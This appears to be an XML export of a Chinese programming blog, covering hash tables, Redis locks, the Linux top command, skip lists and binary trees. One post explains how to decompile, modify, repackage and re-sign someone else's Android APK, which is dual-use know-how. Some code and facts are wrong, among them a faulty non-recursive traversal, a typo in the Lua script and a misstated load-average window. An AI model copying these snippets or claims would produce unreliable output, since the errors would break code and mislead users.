而二次探测探测的步长就变成了原来的“二次方”，也就是说，它探测的下标序列就是hash(key) + 0, hash(key) + 1^2, hash(key) + 2^2…… 所谓双重散列，意思就是不仅要使用一个散列函数，我们使用一组散列函数hash1(key),hash2(key), hash3(key)… 我们想用第一个散列函数，如果计算得到的存储位置已经被占用，在用第二个散列函数，依此类推，直到找到空闲的存储位置。 不管采用那种探测方法，当散列表中空闲位置不多时，散列冲突的概率就会大大提高，为了尽可能保证散列表的操作效率，一般情况下，我们会尽可能的保证散列表中有一定的空闲位置。我们用装载因子来表示空位的多少。 装载因子的计算公式是： 1散列表的装载因子 = 填入表中的空闲个数/ 散列表的长度 装载因子越大，说明空闲位置越少，冲突越多，散列表的性能会下降。 2、链表法链表法是一种更常用的散列冲突解决方法，相比开放寻址法，它要简单得多。我们来看这个图，在散列表中，每个“桶（bucket）” 或者“槽（slot）” 会对应一条链表，所有散列值相同的元素我们都会放到相同槽位对应的链表中。 当插入的时候，我们只需要通过散列函数计算出对应的散列槽位，将其插入到对应的链表中即可，所以插入的时间复杂度是O(1)。当查找、删除一个元素时，我们同样通过散列函数计算出对应的槽，然后遍历链表查找或者删除。那查找和删除操作的时间复杂度是多少呢？ 实际上，这两个操作的时间复杂度跟链表的长度k成正比，也就是o(k)。对于散列比较均匀的散列函数来说，理论上，k=n/m，其中n表示散列中数据的个数，m表示散列中“槽”的个数。 解答开篇 有了前面的这些基础知识储备，我们来看一下开篇的思考题：word文档中单词拼写功能是如何实现的？ 常用的英文单词有20万个左右，假设单词的平均长度是10个字母，平均一个单词占用10个字节的内存空间，那20万英文单词大约占2MB的内存空间，就算放大10倍也就是20MB，对于现在的计算机来说，这个大小完全可以放在内存里面，所以我们可以用散列表来存储整个英文单词词典。 当用户输入某个英文单词时，我们拿用户的输入去散列表中查找。如果查到，索命拼写正确，否则，则说明可能拼写有误，给予提示。借助散列表这种数据结构，我们就可以实现快速判断是否存在拼写错误。 内容小结 今天讲了一些比较基础、比较便理论的散列表知识，包括散列表的由来、散列函数、散列冲突的解决办法。 散列表来源于数组，他借助散列函数对数组这种数据结构进行扩展，利用的是数组支持按照下标随机访问的特性。散列表两个核心问题是“散列函数设计”和“散列冲突解决”。散列冲突有两种常用的解决方法，开放寻址法和链表法，散列函数设计的好坏决定了散列冲突的概率，也就决定了散列表的性能。 针对散列函数和散列冲突，今天我只讲了一些基础的概念、方法。下一节会更贴近实际，更加深入讨论这个问题。 课后思考1、假设我们有10万条URL访问日志，如何按照访问次数给URL排序？ 2、有两个字符串数组，每个数组大约有10万条字符串，如何快速找出两个数组中相同的字符串。 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>散列表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx 配置详解]]></title>
    <url>%2Fposts%2F2019-05-06-Nginx-%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3.html</url>
    <content type="text"><![CDATA[前言 Nginx是Igor Sysoev为俄罗斯访问量第二的rambler.ru站点设计开发的，从2004年发布至今，凭借开源的力量，已经接近成熟和完善。Nginx功能丰富，可以作为HTTP服务器，也可以作为反向代理服务器，邮件服务器，支持FastCGI、SSL、Virtual Host、URL Rewrite、Gzip等功能，并且支持很多第三方的模块扩展。 Nginx的稳定性、功能集、实例配置文件和第系统资源的消耗也让它后来居上，在全球活跃的汪涵中有12.18%的使用比率，大约为2220万个网站。 Nginx常用功能 1、Http代理、反向代理 作为web服务器最常用的功能之一，尤其是反向代理 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>nginx</tag>
        <tag>config</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试不同阶段工具整理]]></title>
    <url>%2Fposts%2F2019-04-22-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%8D%E5%90%8C%E9%98%B6%E6%AE%B5%E5%B7%A5%E5%85%B7%E6%95%B4%E7%90%86.html</url>
    <content type="text"><![CDATA[信息收集 DNS信息收集 Fierce (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>二叉树</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[二叉树的各种操作]]></title>
    <url>%2Fposts%2F2019-04-17-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%90%84%E7%A7%8D%E6%93%8D%E4%BD%9C.html</url>
    <content type="text"><![CDATA[本篇文章针对面试中常见的二叉树操作做个总结： 1、 二叉树的遍历（前序、中序、后序、层次）2、 求树的节点数目3、 求树的叶子节点数目4、 求树的深度5、 求二叉树第k层节点个数6、 求二叉树镜像7、 求两个节点的最低公共祖先节点8、 求任意两节点间距离、最长距离9、 二叉树前序中序 推导后序 二叉树遍历前序遍历前序遍历即根节点在前： 根 -&gt; 左 -&gt; 右 1-2-4-5-3-6 123456789101112131415161718192021222324// 递归实现public static &lt;T&gt; void preOrder(TreeNode&lt;T&gt; root)&#123; if (root == null) return; System.out.println(root.data); preOrder(root.left); preOrder(root.right);&#125;// 非递归实现public static &lt;T&gt; void preOrder01(TreeNode&lt;T&gt; root) &#123; if (root == null) return; LinkedList&lt;T&gt; stack = new LinkedList&lt;&gt;(); stack.push(root); while(!stack.isEmpty())&#123; TreeNode&lt;T&gt; node = stack.pop(); System.out.println(node.data); if (node.right!=null) &#123; stack.push(root.right); &#125; if (node.left!=null) &#123; stack.push(root.left); &#125; &#125;&#125; 中序遍历前序遍历即根节点在前： 左 -&gt; 根 -&gt; 右 4-2-5-1-6-3 123456789101112// 递归实现public static &lt;T&gt; void inOrder(TreeNode&lt;T&gt; root) &#123; if(root == null) return; inOrder(root.left); System.out.println(root.data); inOrder(root.right);&#125;// 非递归实现public static &lt;T&gt; void inOrder01(TreeNode&lt;T&gt; root) &#123; &#125; (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <tags>
        <tag>二叉树</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redis应用场景]]></title>
    <url>%2Fposts%2F2019-04-11-Redis%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF.html</url>
    <content type="text"><![CDATA[Redis 数据结构 Redis是一个开源的内存数据结构存储系统，可以用做数据库，缓存，消息中间件等。Redis中常规的数据结构有5种，string、list、set、zset、hash，同时还有bitmaps、hyperloglogs、geospatial三种不常用的数据结构。 我们经常把redis当作缓存来使用，但是本文只是基于五种常用的数据结构及其相关命令来讨论相关的应用场景，不涉及缓存。 String 首先先看一下Redis中String的操作命令： 123456789101112131415161718SET key value [expiration EX seconds | PX milliseconds] [NX|XX]SETNX key valueSETEX key seconds valuePSETEX key milliseconds valueGET keyGETSET key valueSTRLEN keyAPPEND key valueSETRANGE key offseet valueGETRANGE key start endINCR keyINCRBY key incrementINCRBYFLOAT key incrementDECR keyDECRBY key incrementMSET key value [key value ...]MSETNX key value [key value ...]MGET key [key ...] 命令具体的含义我这里就不一一赘述了。有想要了解的同学可以参考Redis命令参考 分布式锁我们看第一条命令，SET key value [expiration EX seconds | PX milliseconds] [NX|XX]。 通过该命令我们可以实现基于redis的分布式锁，为了确保分布式锁可用，我们至少要确保锁的实现需要满足以下条件： 互斥性，在任一时刻，只有一个客户端持有锁。 不会发生死锁，即使有一个客户端在持有锁的期间崩溃而没有主动解锁，也能保证后续其他客户端能加锁。 容错性，只要大部分Redis节点正常运行，客户端就可以加锁、解锁。 解铃还须系铃人，加锁和解锁必须是同一个客户端，客户端不能把别人的锁给解了。 那该命令如果保证确保分布式锁的可用性呢？ 首先，set 加入了NX参数，可以保证如果有key存在，则其他客户端set 不会成功，也就是只有一个客户端能持有锁。其次，我们可以对锁设置过期时间，即使锁的持有者后续发生了崩溃而没有解锁，锁也会因为到了过期时间自动解锁，不会发生死锁现象。 容错性方面我们可以通过redis cluster来保证锁的高可用及容错性。最后，我们将value设置为requestId，表示加锁的客户端标识，那么客户端解锁的时候就可以进行判断是否为同一个客户端。 加锁我们用代码看一下怎么使用redis来实现分布式锁，非常简单。 1234567public static boolean tryGetLock(Jedis jedis, String lockKey, String requestId, int expire) &#123; String result = jedis.set(lockKey, requestId, "NX", "PX", expire); if ("OK".equals(result)) &#123; return true; // 获取锁成功 &#125; return false; // 获取锁失败&#125; 而在网上有很多人使用jedis.setnx()和jedis.expire()组合实现加锁，代码如下： 12345Long result = jedis.setnx(lockKey, requestId);if (result == 1) &#123; // 如果在这里程序崩溃，则无法设置过期时间，将发生死锁 jedis.expire(lockKey, expire);&#125; 乍一看和上面的set方法结果一样，其实不然，由于这是两条redis命令，不具有原子性，所以如果在setnx 之后程序崩溃，导致锁没有设置过期时间，可能会发生死锁。 解锁123456789public static boolean releaseLock(Jedis jedis, String lockKey,String requestId) &#123; String script = "if redis.call('get', KEY[1]) == ARGV[1] then return redis.call('del',KEYS[1]) else return 0 end"; Object result = jedis.eval(script, Collections.singletonList(lockKey),Collections.singletonList(requestId)); Long success = 1L; if (success.equals(result)) &#123; return true; &#125; return false;&#125; 解锁我们用一行Lua代码来实现，Lua代码的功能是获取锁对应的value，检查是否与requestId相等，如果相等则删除锁(解锁)。eval()方法是将Lua代码交给redis服务器执行。 那为什么要使用Lua语言来实现呢？因为要确保上述操作是原子性的，而eval命令执行Lua代码的时候，Lua代码将被当成一个命令去执行，直到eval命令执行完成，Redis才会执行其他命令。 分布式ID生成我们再来看第二个场景–生成分布式ID， 当使用数据库来生成ID性能不够的时候，可以尝试使用Redis来生成ID，这主要依赖Redis是单线程的，所以也可以用来生成全局唯一ID。可以用Redis的原子操作INCR和INCRBY来实现 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot集成Rabbitmq(二)]]></title>
    <url>%2Fposts%2F2019-04-11-SpringBoot%E9%9B%86%E6%88%90Rabbitmq-%E4%BA%8C.html</url>
    <content type="text"><![CDATA[SpringBoot Rabbitmq 消息可靠性 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot集成Rabbitmq(一)]]></title>
    <url>%2Fposts%2F2019-04-11-SpringBoot%E9%9B%86%E6%88%90Rabbitmq-%E4%B8%80.html</url>
    <content type="text"><![CDATA[SpringBoot Rabbitmq 集成使用 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[Your Time Zone]]></title>
    <url>%2Fposts%2F2019-03-07-Your-Time-Zone.html</url>
    <content type="text"><![CDATA[New York is 3 Hours ahead of California,纽约比加州时间早三个小时， But it does not make California slow.但是加州的时间并没有变慢。 Someone graduated at age of 22,有人22岁就毕业了， but waited 5 years brfore securing a good job！但等了5年才找到好的工作！ Someone became a CEO at 25，有人25岁就当上CEO， and dieed at 50.却在50岁去世。 While another became a CEO at 50，也有人直到50岁才当上CEO， and lived to 90 years。然后活到90岁。 Someone is still single，有些人依然单身， while someone else got married.而有些人已经成婚。 Obama retires at 55,奥巴马55岁就退休了， but Trump starts at 70.但是川普70才当上总统。 Absolutely everyone in this world works based on their Time Zone.世上每个人本来就有自己的发展时区。 People arount you might seem to go ahead of you,身边有些人可能走在你的前面， some might seem to be behind you.也有些可能在你的后边。 But everyone is running their own RACE, in their own TIME.但是每个人都在自己的时区，有着自己的步长 Dont’t envy them or mock them.不用嫉妒或嘲讽他们， They are in their TIME ZONE, and you are in yours!他们都在自己的时区里，你也是！ Life is about waiting for the right moment to act.生命就是在等待正确的行动时机。 So, relax.so，放轻松点。 You are not LATE.你没有落后， And you are not EARLY.也没有领先， You are very much ON TIME, and in your TIME ZONE Desting set up for you.在命运为你安排的属于自己的时区里，一切都非常准时。 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[Linux top 命令详解]]></title>
    <url>%2Fposts%2F2019-02-20-Linux-top-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3.html</url>
    <content type="text"><![CDATA[Linux系统中，top命令经常用来监控Linux的系统状况。可以通过top命令查看系统的CPU、内存、运行时间、线程信息等。通过top命令可以有效分析系统的性能瓶颈在哪里。 一、 top命令解释在Linux系统中执行top命令，就会进入如下界面，下面我们来逐行分析每行代表的意义。 1、 系统运行时间及平均负载top命令的第一行表示的是系统的运行时间及平均负载，与uptime命令有相似的输出。 123456 top - 17:05:18 up 190 days, 3:54, 1 user, load average: 0.00, 0.02, 0.05-- 17:05:18 系统的当前时间-- up 190 days, 3:54 系统已经运行的时间 190天3小时54分钟，期间没有重启-- 1 user 系统当前登录用户数 表示系统当前只有一个用户登录-- load average: 0.00, 0.02, 0.05 load average后面的三个数分别是5分钟、10分钟、15分钟的负载情况 load average数据是每隔5秒钟检查一次活跃的进程数，然后按照特定算法计算出的数值。如果这个数除以逻辑CPU的数量，结果高于5的时候就表明系统在超负荷运转了。 2、任务第二行显示的是任务或者进程的总结。进程可以处于不同的状态，这里显示了全部进程的数量。 12Tasks: 65 total, 1 running, 64 sleeping, 0 stopped, 0 zombie# 总共有65个进程，1个正在运行， 64个休眠，0个停止，0个僵尸进程 3、CPU状态1%Cpu(s): 0.9 us, 1.2 sy, 0.0 ni, 97.6 id, 0.1 wa, 0.0 hi, 0.2 si, 0.0 st 这里显示的是不同模式下所占CPU时间百分比，不同CPU时间表示： us user, 运行用户进程的CPU时间，消耗在用户空间的时间 sy system，运行内核进程的CPU时间，即消耗在内核空间的时间 ni niced，运行已调整优先级的用户进程的CPU时间 id idle，空闲CPU百分比，这个值越低，表示cpu越忙 wa wait，用于等待IO完成的CPU时间百分比，这个值越高说明外接设备有问题 hi hardware interrupt，处理硬件中断的CPU时间 si software interrupt，处理软中断的CPU时间 st 虚拟机被hypervisor偷去的CPU时间（如果当前处于一个hypervisor的虚拟机，实际上hypervisor也是要消耗一部分CPU时间的）。 在这里CPU的使用比率和windows概念不同，如果你不理解用户空间和内核空间，需要充电了。 4、内存使用12KiB Mem: 2027864 total, 1945796 used, 82068 free, 15064 buffersKiB Swap: 1048572 total, 87168 used, 961404 free. 398840 cached Mem 这两行显示的是内存使用率，有点像free命令。第一行是物理内存使用，第二行是虚拟内存使用（交换空间）。 内存显示如下： 全部可用内存 已使用内存 空闲内存 缓冲内存 物理内存 物理内存总量2027864 使用中的内存总量1945796 空闲内存总量82068 缓存的内存量15064 交换分区 交换分区总量1048572 使用的交换分区总量87168 空闲交换分区总量961404 缓存的交换区总量398840 这里要说明的是不能用windows的内存概念理解这些数据，如果按照windows的方式此台服务器“危矣”。 对于内存监控，在top里我们要时刻监控第五行swap交换分区的used，如果这个数值在不断的变化，说明内核在不断进行内存和swap的数据交换，这是真正的内存不够用了。 5、各进程的状态监控第六行是空行，第七行开始是个任务的状态监控。 1234567891011121314151617181920212223PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 1 root 20 0 54428 5512 3032 S 0.0 0.3 10:29.07 systemd 2 root 20 0 0 0 0 S 0.0 0.0 0:00.90 kthreadd 3 root 20 0 0 0 0 S 0.0 0.0 0:25.90 ksoftirqd/0 5 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 kworker/0:0H 7 root rt 0 0 0 0 S 0.0 0.0 0:00.00 migration/0 8 root 20 0 0 0 0 S 0.0 0.0 0:00.00 rcu_bh 9 root 20 0 0 0 0 S 0.0 0.0 1:22.61 rcu_sched 10 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 lru-add-drain 11 root rt 0 0 0 0 S 0.0 0.0 0:36.39 watchdog/0 13 root 20 0 0 0 0 S 0.0 0.0 0:00.00 kdevtmpfs 14 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 netns 15 root 20 0 0 0 0 S 0.0 0.0 0:01.43 khungtaskd 16 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 writeback 17 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 kintegrityd 18 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 bioset 19 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 bioset 20 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 bioset 21 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 kblockd 22 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 md 23 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 edac-poller 24 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 watchdogd 30 root 20 0 0 0 0 S 0.0 0.0 0:26.98 kswapd0 PID: 进程ID，进程的唯一标识USER： 进程所有者的实际用户名PR： 进程的调度优先级，这些值中有些是rt，表示这些进程运行在实时态NI： 进程的nice值（优先级）越小的值意味着越高的优先级。负值表示高优先级，正值表示低优先级VIRT： 进程使用的虚拟内存。进程使用的虚拟内存总量，单位是kb，VIRT=SWAP+RESRES: 驻留内存大小，驻留内存是任务使用的非交换物理内存大小。进程使用的、未被换出的物理内存大小，单位是kb，RES=CODE+DATASHR： SHR是进程使用的共享内存。S： 这个是进程的状态。它有以下不同的值： D - 不可中断的睡眠态 R - 运行态 S - 睡眠态 T - 被跟踪或已停止 Z - 僵尸态%CPU： 自从上一次更新时到现在任务所使用的CPU时间百分比%MEM： 进程使用的可用物理内存百分比TIME+： 任务启动后到现在所使用的全部CPU时间，精确到百分之一秒。COMMAND：运行进程所使用的命令。进程名称（命令名/命令行） 还有许多在默认情况下不会显示的输出，他们可以显示进程的页错误、有效组、组ID和其他更多的信息。 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>top</tag>
        <tag>运维</tag>
        <tag>负载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android APK 反编译、重打包、签名]]></title>
    <url>%2Fposts%2F2019-01-10-Android-APK-%E5%8F%8D%E7%BC%96%E8%AF%91%E3%80%81%E9%87%8D%E6%89%93%E5%8C%85%E3%80%81%E7%AD%BE%E5%90%8D.html</url>
    <content type="text"><![CDATA[首先声明，反编译别人的APK是一件不厚道的事情，本文抱着学习的态度，学习如何使用工具反编译Android APK。 一、工具apktool, 编译和反编译apk，提取图片、布局等资源dex2jar，将可运行文件class.dex反编译为可读的jar源代码jd-gui, 查看jar源代码 二、反编译2.1、 apktool安装windows下安装 1、安装java，配置环境变量2、下载最新apktool.bat3、下载最新apktool.jar4、将apktool.bat和apktool.jar放在同一目录下，然后就可以在命令行使用了 2.2、 用法可以直接在命令行执行apktool.bat使用。这里介绍两个最常用的用法。 反编译 1apltool.bat d -o &lt;output_dir&gt; test.apk 其中&lt;output_dir&gt;指定输出目录，默认为apk名称，test.apk为需要反编译的apk 编译 1apltool.bat b -o &lt;output.apk&gt; &lt;input_dir&gt; 其中&lt;input_dir&gt;为上面反编译输出的目录，&lt;output.apk&gt; 是编译输出的apk apktool反编译后的典型目录如下： 此时，可以查看AndroidMainfest.xml、res、smali文件了。甚至可以修改目录下的资源文件或smali文件，然后重新编译打包发布。值得注意的是，apktool反编译出来的是smali文件，即汇编语言版本，并不能查看源代码。 三、查看源代码查看源代码的话，这里需要用到dex2jar、jd-gui这两个工具。 1、将需要反编译的apk后缀改为rar或zip并解压到一个文件夹，得到其中的class.dex2、用dex2jar工具反编译class.dex得到jar文件 classes-dex2jar.jar 3、使用jd-gui打开classes-dex2jar.jar，就可以查看源码了，当然如果代码发布的时候做过混淆，我们也只能看到混淆过的代码。所以代码混淆的重要性不言而喻。 四、修改代码如果只是修改APK相应的资源，例如图片、字符串比较好办，在res文件夹找到相应的文件替换即可。 修改代码就比较麻烦，因为反编译出来的结果只有smali文件，即java虚拟机支持的汇编语言。如果确实需要修改代码，就得对照smali文件和反编译出来的源码，按照smali规范来改代码，相当于写汇编，所以难度还是比较大的。 五、重新打包修改代码完成后，还需要重新打包以及重新签名。重新打包使用apktool编译修改过的目录即可。 1apltool.bat b -o &lt;output.apk&gt; &lt;input_dir&gt; 六、签名签名是要对发布的apk文件做标记，确保你的apk文件有唯一的身份归属认证，只有相同的签名和相同包名的文件才可以覆盖安装并保留用户信息。 对于反编译的apk，我们可以用java工具jarsigner来对它进行签名。 1、生成keystroe文件 签名需要keystore文件，可以使用keytool工具生成，java环境一般都自带keytool命令，可以直接在命令行中进行测试。 1keytool -genkey -alias demo.keystore -keyalg RSA -VALIDITY 40000 -keystore demo.keystore 各个参数意义如下：-genkey 产生证书文件-alias 产生别名-keystore 制定密钥库的.keystore文件-keyalg 制定密钥算法 这里指定为RSA 非对称密钥算法-validity 证书有效天数 2、签名apk 签名工具使用jarsigner，jarsigner也存在于Java JDK中，所以如果安装好Java环境，可以直接在命令行中使用。 1jarsigner -verbos -keystore &lt;keystore密钥库位置&gt; &lt;待签名的APK&gt; &lt;密钥库别名&gt; -verbose 制定生成详细输出-keystore 制定数字证书存储路径 这样就完成了对APK的重签名过程，然后就可以安装使用了。如果你的手机上原来就有这个APP，则需要卸载之后重新安装，因为签名已经改变。 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <tags>
        <tag>反编译</tag>
        <tag>apktool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-跳表]]></title>
    <url>%2Fposts%2F2018-12-17-%E7%AE%97%E6%B3%95-%E8%B7%B3%E8%A1%A8.html</url>
    <content type="text"><![CDATA[前言 上两节我们讲了二分查找算法。当时讲到，因为二分查找底层依赖的是数组随机访问的特性，所以只能用数组实现。如果数据存储在链表中，就真的没法用二分查找算法吗？ 实际上，我们只要对链表稍加改造，就可以支持类似“二分”的查找算法。我们把改造之后的数据结构叫做“跳表”，也就是今天的主要学习内容。 跳表这种数据结构对比来讲，可能会比较陌生，因为一般的数据结构和算法书籍都不会将。但是它确实是一种各方面性能都比较优秀的动态数据结构，可以支持快速的插入、删除、查找操作，写起来也不复杂，甚至可以代替红黑树。 Redis中的有序集合（Sorted Set）就是用跳表来实现的。如果你有一定基础，应该直到红黑树也可以实现快速的插入、删除和查找操作。那redis为什么会选择用跳表来实现有序集合呢？，为什么不用红黑树呢？学完今天的内容，你就知道答案了。 如何理解”跳表” 对于一个链表来说，即便链表中存储的数据是有序的，如果我们要想在其中查找某个数据，也只能从头到尾遍历列表。这样查找效率就会很低，时间复杂度很高，是O(n)。 那怎样来提高查找效率呢？如果向下图那样，对链表建立一级索引，查找起来是不是就会快很多呢？每两个节点提取一个节点到上一级，我们把抽出来的那一级叫做索引或索引层。你可以看看我画的图，图中的down表示down指针，指向下一级节点。 如果我们现在要查找某个节点，比如16。我们现在索引层遍历，当遍历到索引中值位13的节点时，我们发现下一个节点是17，那要查找的节点16肯定就在这两个节点之间。然后我们通过索引节点的down指针，下降到原始链表，继续遍历。这个时候我们只需要在遍历两个节点，就可以找到值为16的节点了。这样，原来要查找16，需要遍历10个节点，现在只需要遍历7个节点。 从这个例子，我们看出，加了一层索引之后，查找一个节点需要遍历的节点个数减少了，也就是说查询效率提高了。那如果我们再加一层索引呢？效率会不会提高更多？ 跟前面建立一级索引的方式类似，我们每两个节点都抽出一个节点到二级索引。现在我们再来查找16，只需要遍历6个节点，需要遍历的节点数量又减少了。 我举的例子数据量不大，所以即便加了两级索引，查找效率的提升也并不明显。我画了一个64个节点的链表，按照前面将的这种思路，建立了五级索引。 从图中可以看出，原来没有索引的时候，查找62需要遍历62个节点，现在只需要遍历11个节点，速度是不是提高了很多？所以，当链表的长度n比较大时，比如，1000、10000的时候，在构建索引后，查找效率的提升就会非常明显。 前面讲的这种链表添加多级索引的结构，就是跳表。我通过例子给你展示了跳表是如何减少查询次数的，现在你应该比较清晰的知道，跳表确实可以提高查找效率的。接下来，我会定量的分析一下，用跳表查询到底有多快。 用跳表查询到底有多快 前面我讲过，算法的执行效率可以通过时间复杂度来衡量，这里依旧可以用。我们知道，在一个单链表中查询某个数据的时间复杂度为O(n)。那么在一个具有多级索引的跳表中，查询某个数据的时间复杂度是多少呢？ 这个时间复杂度的分析方法比较难想到，我把问题分析一下，先来看这样一个问题，如果链表里有n个节点，会有多少级索引呢？ 按照我们刚才讲的，每两个节点会抽出一个节点作为上一级索引的节点，那第一级索引的个数大约为n/2个，第二级索引的节点个数大约为n/4，第三级节点个数大约为n/8，以此类推，也就是说，第k级索引的节点个数是第k-1级索引的节点个数的1/2，那第k级索引的节点个数为$\frac{n}{2^k}$。 假设索引有h级，最高级的索引有2个节点，通过上面的公式，我们可以得到$\frac{n}{2^k}$ = 2，从而求得$h=log_2(n-1)$。如果包含原始链表这一层，整个跳表的高度就是$log_2n$。我们在跳表中查询某个数据的时候，如果每一层都要遍历m个节点，那在跳表中查询一个数据的时间复杂度就是O($m*logn$)。 那么这个m的值是多少呢？按照前面这种结构，我们每一级索引都最多只需要遍历3个节点，也就是说m=3，为什么是3呢？我来解释一下。 假设我们要查找的数据是x，在第k级索引中，我们遍历到y节点之后，发现x大于y，小于后面的节点z，索引我们通过y的down指针，从第k级索引下降到第k-1级索引。在第k-1索引中，y和z之间只有3个节点（包含y和z），所以，我们在k-1级索引中最多只需要遍历3个节点，以此类推，每一级索引都最多只需要遍历3个节点。 通过上面的分析，我们得到m=3，所以在跳表中查询任意数据的时间复杂度就是O(logn)。这个查找的时间复杂度跟二分查找是一样的。换句话说，我们其实是基于单链表实现了二分查找，是不是很神奇？不过天下没有免费的午餐，这种查询效率的提升，前提是建立了很多级索引，也就是我们前面讲过的空间换时间的思想。 跳表是不是很费内存 比起单纯的单链表，跳表需要存储多级索引，肯定要消耗更多的存储空间。那到底需要消耗多少额外的存储空间呢？我们来分析一下跳表的空间复杂度。 跳表的空间复杂度分析并不难，我在前面说了，假设原始链表大小为n，那第一级索引大约有n/2个节点，第二级索引大约有n/4个节点，以此类推，每上升一级就减少一半，知道剩下2个节点。如果我们把每层索引的节点数写出来，就是一个等比数列。 这几级索引的节点总和就是$n/2+n/4+n/8+…+8+4+2=n-2$。所以跳表的空间复杂度为O(n)。也即是说，如果将包含n个节点的单链表构造成跳表，我们需要额外再用接近n个节点的存储空间。那我们有没有办法降低索引占用的内存空间呢？ 我们前面都是每两个节点抽取一个节点到上级索引，如果我们每三个节点或者五个节点，抽一个节点到上级索引，是不是就不用那么多索引节点了呢？我画了一个每三个节点抽取一个节点的示例图，你可以看下。 从图中可以看出，第一级索引需要大约n/3个节点，第二级索引大约需要n/9个节点。每往上一层，索引节点个数都除以3。为了方便计算，我们假设最高一级的索引节点个数为1，我们把每级索引的节点个数都写下来，也是一个等比数列。 通过等比数列求和公式，总的索引节点个数就是$n/3+n/9+n/27+…+9+3+1=n/2$。尽管空间复杂度还是O(n)，但比上面的每两个节点抽一个节点的索引构建方法，要减少了一半的索引节点存储空间。 实际上，在软件开发中，我们不必太在意索引占用的额外空间。在将数据结构和算法时，我们习惯性的把要处理的数据看成是整数，但是在实际的软件开发中，原始链表中存储的数据存储的很可能是很大的对象，而索引节点只需要存储关键值和几个指针，并不需要存储对象，所以当对象比索引节点大很多时，那索引占据的额外空间就可以忽略了。 高效的动态插入和删除 跳表长什么样子我想你应该很清楚了，他查找操作我们刚才也讲过了。实际上，跳表这个动态数据结构，不仅支持查找操作，还支持动态的插入、删除操作，而且插入、删除操作的时间复杂度也是O(logn)。 我们现在来看下，如何在跳表中插入一个数据，以及它是如何做到O(logn)的时间复杂度的？ 我们知道，在单链表中，一旦定位好要插入的位置，插入节点的时间复杂度是很低的，就是O(1)。但是为了保证原始链表中数据的有序性，我们需要先找到要插入的位置，这个查找操作就会比较耗时。 对于纯粹的单链表，需要遍历每个节点，来找到插入的位置，但是，对于跳表来说，我们讲过查找某个节点的时间复杂度是O(logn)，所以这里查找数据应该插入的位置，方法也是类似的，时间复杂度为O(logn)。我画了一张图，你可以很清晰的看到插入的过程。 跳表查找插入 跳表查找插入.jpg 好了，我们再来看删除操作。 如果要删除的节点在索引中也有出现，我们除了要删除原始链表中的节点，还要删除索引中的。因为单链表中删除操作还需要拿到删除节点的前驱节点，然后通过指针操作完成。所以在查找要删除的节点时，一定要获取前驱节点。当然，如果我们用的是双向链表，就不需要考虑这个问题了。 跳表索引动态更新 当我们不停的往跳表中插入数据时，如果我们不更新索引，就有可能出现某2个索引节点之间数据非常多的情况，极端情况下，跳表还会退化成单链表。 作为一种动态数据结构，我们需要某种手段来维护索引与原始链表大小之间的平衡，也就是说，如果链表中的节点多了，索引节点就相应的增加一下，避免复杂度退化，以及查找、插入、删除操作性能下降。 如果你了解红黑树、AVL树这样的平衡二叉树，你就知道他们是铜鼓片左右旋的方式保持左右子树的平衡，而跳表是通过随机函数来维护前面提到的平衡性。 当我们往跳表中插入数据时，我们可以选择将这个数据插入到部门索引层。如何选择加入到哪些索引层呢？ 我们通过一个随机函数，来决定将这个节点插入到哪几级索引中，比如随机函数生成了值K，那我们就将这个节点添加到第一级到第k级索引中。 随机函数的选择很有讲究，从概率上讲，能够保证跳表的索引大小和数据大小平衡性，不至于性能过度退化。至于随机函数的选择，我就不展开讲了，如果你感兴趣的话，可以看看我在Github上代码或者redis中关于有序集合的跳表实现。 跳表的实现还是稍微有点复杂的，我将java代码放在了github上，你可以根据我刚刚的讲解，对照着代码思考一下，你不用死记硬背代码，跳表的实现并不是我们这节的重点。 解答开篇 今天的内容就完了。现在我们来看一下开篇的思考题：为什么redis中用跳表来实现有序集合，而不是红黑树。 Redis中的有序集合是通过跳表来实现的，严格来讲，其中来用到了散列表。不过散列表我们后面再讲，现在先忽略这部分，如果你去查看Redis的开发手册，就会发现，Redis中的有序集合支持的核心操作主要有以下这几个： 插入一个数据 删除一个数据 查找一个数据 按照区间查找数据 迭代输出有序序列 